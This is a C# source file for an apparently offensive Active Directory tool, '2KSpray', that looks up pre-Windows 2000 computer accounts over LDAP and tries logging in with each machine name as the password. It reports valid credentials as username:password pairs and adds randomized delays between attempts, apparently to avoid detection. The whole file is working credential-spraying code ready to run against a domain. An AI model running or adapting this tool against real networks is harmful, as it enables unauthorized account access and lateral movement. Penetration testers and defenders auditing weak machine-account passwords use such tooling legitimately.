using System;
using System.Threading.Tasks;
using System.DirectoryServices;
using System.IO;
using System.Runtime.InteropServices;

namespace _2KSpray
{
    class Program
    {
        const int LOGON32_LOGON_NETWORK = 3;
        const int LOGON32_PROVIDER_DEFAULT = 0;

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(
            string lpszUsername,
            string lpszDomain,
            string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            out IntPtr phToken
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        static async Task Main(string[] args)
        {
            Console.WriteLine(@"
░▀▀▄░█░█░█▀▀░█▀█░█▀▄░█▀█░█░█
░▄▀░░█▀▄░▀▀█░█▀▀░█▀▄░█▀█░░█░
░▀▀▀░▀░▀░▀▀▀░▀░░░▀░▀░▀░▀░░▀░

               By Mor David
");

            string domain = null;
            string timesleep = "0";
            string outputFile = null; // Default output file is null

            for (int i = 0; i < args.Length; i += 2)
            {
                string flag = args[i];
                string value = i + 1 < args.Length ? args[i + 1] : null;

                switch (flag.ToLower())
                {
                    case "-d":
                    case "--domain":
                        domain = value;
                        break;

                    case "-t":
                    case "--timesleep":
                        timesleep = value;
                        break;

                    case "-o":
                    case "--output":
                        outputFile = value;
                        break;

                    default:
                        Console.WriteLine($"Unknown flag: {flag}");
                        return;
                }
            }

            if (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(timesleep))
            {
                Console.WriteLine("Usage: Sharp2K.exe -d/--domain <Domain> -t/--timesleep <DelayMilliseconds> [-o/--output <OutputFile>]");
                return;
            }

            using (StreamWriter writer = outputFile != null ? new StreamWriter(outputFile, append: true) : null)
            {
                using (DirectorySearcher searcher = new DirectorySearcher($"(userAccountControl=4128)"))
                {
                    searcher.SearchRoot = new DirectoryEntry($"LDAP://{domain}");
                    searcher.PropertiesToLoad.Add("name");

                    SearchResultCollection results = searcher.FindAll();

                    string[] computers = new string[results.Count];
                    for (int i = 0; i < results.Count; i++)
                    {
                        string result = TestIt(results[i].Properties["name"][0].ToString(), domain);
                        await DelayWithJitterAsync(Int32.Parse(timesleep));
                        Console.WriteLine(result);
                        if (writer != null)
                            writer.WriteLine(result);
                    }
                }
            }
            Console.WriteLine("[+] Done");
        }
        static string UserFixer(string username)
        {
            if (username.Length <= 15)
            {
                return username;
            }
            else
            {
                return username.Substring(0, 15);
            }
        }

        static string PasswordFixer(string password)
        {
            if (password.Length <= 14)
            {
                return password;
            }
            else
            {
                return password.Substring(0, 14);
            }
        }

        static string AuthenticateMachineAccount(string username, string password, string domain)
        {
            IntPtr tokenHandle;
            bool isAuthenticated = LogonUser(username, domain, password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, out tokenHandle);

            if (isAuthenticated)
            {
                CloseHandle(tokenHandle);
                return $"Success: {username}:{password}";
            }
            else
            {
                return $"Failed: {username}";
            }
        }

        static string TestIt(string host, string domain)
        {
            try
            {
                return AuthenticateMachineAccount(UserFixer(host) + "$", PasswordFixer(host.ToLower()), domain);
            }
            catch (Exception ex)
            {
                return $"An error occurred: {ex.Message}";
            }
        }

        static async Task DelayWithJitterAsync(int milliseconds)
        {
            var random = new Random();
            var jitter = random.Next(-milliseconds / 2, milliseconds / 2);

            var totalDelay = milliseconds + jitter;

            if (totalDelay < 0)
                totalDelay = 0;

            await Task.Delay(totalDelay);
        }
    }
}
